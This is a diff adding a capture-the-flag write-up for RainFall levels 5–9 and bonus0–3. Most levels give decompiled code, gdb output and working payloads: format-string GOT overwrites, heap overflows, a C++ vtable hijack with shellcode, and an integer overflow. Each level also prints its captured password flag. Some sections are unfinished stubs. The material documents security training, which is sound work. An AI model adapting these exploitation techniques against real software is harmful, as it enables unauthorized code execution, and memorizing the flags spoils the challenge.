@@ -400,3 +400,415 @@ level4@RainFall:~$ python -c "print('\x10\x98\x04\x08%.0s%.0s%.0s%.0s%.0s%.0s%.0
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
 
+## level5
+
+Once again, the vulnerability is caused by a user string being used directly as the format string in `printf`. We'll try to use it to override the address of `exit` with the address of `o`.
+
+```c
+void o() {
+    system("/bin/sh");
+    _exit(1);
+}
+
+void n() {
+    char s[520];
+
+    fgets(s, 512, stdin);
+    printf(s);
+    exit(1);
+}
+
+int main() { n(); }
+```
+
+The Global Offset Table (GOT) is a table of addresses of the locations in memory of the libc functions. `exit@got`, for example, will contain the address of `exit` in memory. If the address is empty, the dynamic linker will be used to get the function address.
+
+
+We can find the address of `exit@got` by decompiling `exit`/`exit@plt`.
+
+```
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+[...]
+0x080483d0  exit
+0x080483d0  exit@plt
+[...]
+(gdb) disassemble 0x080483d0
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:     jmp    *0x8049838
+   0x080483d6 <+6>:     push   $0x28
+   0x080483db <+11>:    jmp    0x8048370
+End of assembler dump.
+```
+
+We'll also need the address of `o`:
+
+```
+(gdb) p o
+$4 = {<text variable, no debug info>} 0x80484a4 <o>
+```
+
+We then write a probe to find the address of the format string on the stack.
+
+```console
+level5@RainFall:~$ python -c 'print("%x " * 10)' | ./level5
+200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
+```
+
+To recapitulate:
+- o = 0x080484a4 = 134513828 = (2052 << 16) | 33956
+- exit@got = 0x08049838
+- the format string is at the 4th place on the stack
+
+We can then create a complete payload, similarly to the previous level, but with the added trick of using `%hn` to split the number of characters to write (~134 million) in two much smaller values.
+
+The full payload is:
+- exit@got low
+- exit@got high
+- 2052 - 8 = 2044 padding chars
+- %4$hn : write 2052 to 4th argument (actually start of format string)
+- 33956 - 2052 = 31904 padding chars
+- %5$hn : write 33956 to 5th argument (actually start of format string + 4)
+
+```console
+level5@RainFall:~$ (python -c 'print("\x3a\x98\x04\x08\x38\x98\x04\x08%2044d%4$hn%31904d%5$hn")' ; cat) | ./level5
+[...]
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+
+## level6
+
+This level is a toy introduction to heap overflows. We want to change the value of `fn_ptr` from `m` to `n`.
+
+```c
+void n() { system("/bin/cat /home/user/level7/.pass"); }
+
+void m() { puts("Nope"); }
+
+int main(int argc, char** argv) {
+    char* dst = malloc(64);
+    void (**fn_ptr)() = malloc(4);
+
+    *fn_ptr = m;
+    strcpy(dst, argv[1]);
+    (*fn_ptr)();
+}
+```
+
+`strcpy` copies until it finds a null terminator, so it is very vulnerable to buffer overflows.
+
+The payload is simply 72 chars of padding (64 for dst + 8 for malloc metadata), followed by the address of `n` in little-endian.
+
+```console
+$ objdump -t level6 | grep n
+08048454 g     F .text  00000014              n
+$ ./level6 $(python -c 'print("A" * 64 + "\x54\x84\x04\x08")')
+Nope
+$ ./level6 $(python -c 'print("A" * 68 + "\x54\x84\x04\x08")')
+Segmentation fault (core dumped)
+$ ./level6 $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+$ ./level6 $(python -c 'print("A" * 76 + "\x54\x84\x04\x08")')
+Segmentation fault (core dumped)
+```
+
+An even simpler solution, which doesn't require calculating any padding, is to spam the address of `n`, which will overwrite `fn_ptr` (and many other things).
+
+```console
+level6@RainFall:~$ ./level6 $(python -c 'print("\x54\x84\x04\x08" * 99)')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
+
+## level7
+
+This level uses ideas from the two previous ones. We'll use a heap overflow to overwrite the GOT.
+
+```c
+char c[68];
+
+typedef struct item_t {
+    int id;
+    char* buf;
+} item_t;
+
+void m() {
+    printf("%s - %d\n", c, (int)time(NULL));
+    return;
+}
+
+int main(int argc, char** argv) {
+    item_t* item1 = malloc(sizeof(item_t));
+    item1->id = 1;
+    item1->buf = malloc(8);
+
+    item_t* item2 = malloc(sizeof(item_t));
+    item2->id = 2;
+    item2->buf = malloc(8);
+
+    strcpy(item1->buf, argv[1]);
+    strcpy(item2->buf, argv[2]);
+
+    FILE* stream = fopen("/home/user/level8/.pass", "r");
+    fgets(c, 68, stream);
+
+    puts("~~");
+    return 0;
+}
+```
+
+We need to call `m` after `fgets`, so that the file has been written to the global variable `c`. We'll overwrite the address of `puts@got`.
+
+```console
+(gdb) p m
+$1 = {<text variable, no debug info>} 0x80484f4 <m>
+(gdb) i fun puts  
+All functions matching regular expression "puts":
+
+Non-debugging symbols:
+0x08048400  puts
+0x08048400  puts@plt
+[...]
+(gdb) x/i 0x08048400
+   0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928
+```
+
+With the first argument, we can change the address of `item2->buf` to point to `puts@got`. We first need 20 bytes of padding. (8 for `item1->buf` + 8 for `malloc` metadata + 4 for `item2->id`)
+
+With the second argument, we overwrite the GOT with the address of `m`.
+
+```console
+level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1765095212
+```
+
+
+## level8
+
+https://dogbolt.org provides 11 different disassembly tools, and the output of Hex-Rays was by far the best for this level. With a bit of cleaning we get this:
+
+```c
+char* auth;
+char* service;
+
+int main() {
+    char buf[128];
+
+    while (true) {
+        printf("%p, %p \n", auth, service);
+        if (!fgets(buf, 128, stdin)) break;
+        if (!strncmp(buf, "auth ", 5)) {
+            auth = malloc(4);
+            auth[0] = 0;
+            if (strlen(buf + 5) <= 30) strcpy(auth, buf + 5);
+        }
+        if (!strncmp(buf, "reset", 5)) free(auth);
+        if (!strncmp(buf, "service", 6)) service = strdup(buf + 7);
+        if (!strncmp(buf, "login", 5)) {
+            if (auth[32]) {
+                system("/bin/sh");
+            } else {
+                fwrite("Password:\n", 1, 10, stdout);
+            }
+        }
+    }
+    return 0;
+}
+```
+
+Working backwards, we see that we need `auth[32]` to contain a value, but `auth` is supposed to be only 4 characters long. It will read byte 20 of the next allocation, which we can create with `service` and a sufficiently long padding.
+
+```console
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth axel
+0x804a008, (nil) 
+service!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+0x804a008, 0x804a018 
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+
+
+## level9
+
+This is the first C++ level.
+
+```cpp
+
+class N {
+  public:
+    N(int value) : _value(value) {}
+
+    void setAnnotation(const char* text) {
+        std::memcpy(_annotation, text, std::strlen(text));
+    }
+
+    int operator+(const N& other) { return this->_value + other._value; }
+    int operator-(const N& other) { return this->_value - other._value; }
+
+    // at least one virtual method
+
+  private:
+    // 4 bytes here for the vtable
+    char _annotation[100];
+    int _value;
+};
+
+int main(int argc, char** argv) {
+    if (argc < 2) std::exit(1);
+
+    N* a = new N(5);
+    N* b = new N(6);
+
+    a->setAnnotation(argv[1]);
+    return *b + *a;
+}
+```
+
+A buffer overflow is available through `memcpy`, since the length of `text` is not checked. We'll use
+
+> In computer programming, a virtual method table (VMT), virtual function table, virtual call table, dispatch table, vtable, or vftable is a mechanism used in a programming language to support dynamic dispatch (or run-time method binding).
+> Whenever a class defines a virtual function (or method), most compilers add a hidden member variable to the class that points to an array of pointers to (virtual) functions called the virtual method table. These pointers are used at runtime to invoke the appropriate function implementations, because at compile time it may not yet be known if the base function is to be called or a derived one implemented by a class that inherits from the base class. 
+> -- https://en.wikipedia.org/wiki/Virtual_method_table
+
+This part of the assembly shows the use of a vtable. First we get `b`, then its first element (which is the vtable for classes with at least one virtual method) is read, then the first function of the vtable is called.
+
+```nasm
+   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
+   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
+   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
+[...]
+   0x08048693 <+159>:   call   edx
+```
+
+We want to override the first entry of b's vtable. To do so, we'll write a shellcode in `a->_annotation`
+
+```
+(gdb) p/x *(void **)( $esp + 0x14 )
+$1 = 0x804a008
+```
+
+`a` = 0x0804a008
+`a->_annotation` = 0x0804a00c
+`a->_annotation + 4` (address of the shellcode) = 0x0804a010
+
+The payload written in `a->_annotation`:
+- address of the shellcode
+- shellcode
+- padding to reach `b`'s vtable
+- address of `a->_annotation`
+
+On the next line, `*b + *a` is going to be executed. It will jump to `a->_annotation` instead of `b`'s vtable, then when our fake vtable will point to the shellcode, which is going to be executed.
+
+```console
+level9@RainFall:~$ ./level9 $(python /tmp/level9.py)
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+
+
+## bonus0
+
+```console
+(gdb) disas pp
+Dump of assembler code for function pp:
+   0x0804851e <+0>:     push   ebp
+   0x0804851f <+1>:     mov    ebp,esp
+   0x08048521 <+3>:     push   edi
+   0x08048522 <+4>:     push   ebx
+   0x08048523 <+5>:     sub    esp,0x50
+   0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0
+   0x0804852e <+16>:    lea    eax,[ebp-0x30]
+   0x08048531 <+19>:    mov    DWORD PTR [esp],eax
+   0x08048534 <+22>:    call   0x80484b4 <p>
+   0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0
+   0x08048541 <+35>:    lea    eax,[ebp-0x1c]
+   0x08048544 <+38>:    mov    DWORD PTR [esp],eax
+   0x08048547 <+41>:    call   0x80484b4 <p>
+   0x0804854c <+46>:    lea    eax,[ebp-0x30]
+   0x0804854f <+49>:    mov    DWORD PTR [esp+0x4],eax
+   0x08048553 <+53>:    mov    eax,DWORD PTR [ebp+0x8]
+   0x08048556 <+56>:    mov    DWORD PTR [esp],eax
+   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
+   0x0804855e <+64>:    mov    ebx,0x80486a4
+   0x08048563 <+69>:    mov    eax,DWORD PTR [ebp+0x8]
+   0x08048566 <+72>:    mov    DWORD PTR [ebp-0x3c],0xffffffff
+   0x0804856d <+79>:    mov    edx,eax
+   0x0804856f <+81>:    mov    eax,0x0
+   0x08048574 <+86>:    mov    ecx,DWORD PTR [ebp-0x3c]
+   0x08048577 <+89>:    mov    edi,edx
+   0x08048579 <+91>:    repnz scas al,BYTE PTR es:[edi]
+   0x0804857b <+93>:    mov    eax,ecx
+   0x0804857d <+95>:    not    eax
+   0x0804857f <+97>:    sub    eax,0x1
+   0x08048582 <+100>:   add    eax,DWORD PTR [ebp+0x8]
+   0x08048585 <+103>:   movzx  edx,WORD PTR [ebx]
+   0x08048588 <+106>:   mov    WORD PTR [eax],dx
+   0x0804858b <+109>:   lea    eax,[ebp-0x1c]
+   0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax
+   0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8]
+   0x08048595 <+119>:   mov    DWORD PTR [esp],eax
+   0x08048598 <+122>:   call   0x8048390 <strcat@plt>
+   0x0804859d <+127>:   add    esp,0x50
+   0x080485a0 <+130>:   pop    ebx
+   0x080485a1 <+131>:   pop    edi
+   0x080485a2 <+132>:   pop    ebp
+   0x080485a3 <+133>:   ret    
+End of assembler dump.
+```
+
+We can do 20 then 19.
+
+```console
+bonus0@RainFall:~$ ./bonus0 
+ - 
+abcdefghijklmnopqrst
+ - 
+abcdefghijklmnopqrs 
+abcdefghijklmnopqrstabcdefghijklmnopqrs abcdefghijklmnopqrs
+Segmentation fault (core dumped)
+```
+
+TODO clean
+
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+
+## bonus1
+
+```console
+bonus1@RainFall:~$ bc <<< 11-2^30 
+-1073741813
+bonus1@RainFall:~$ echo -e '\x57\x4f\x4c\x46' | rev
+FLOW
+bonus1@RainFall:~$ ./bonus1 -1073741813 FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+
+## bonus2
+
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+
+## bonus3
+
+```console
+bonus3@RainFall:~$ ./bonus3 ''
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
+
+
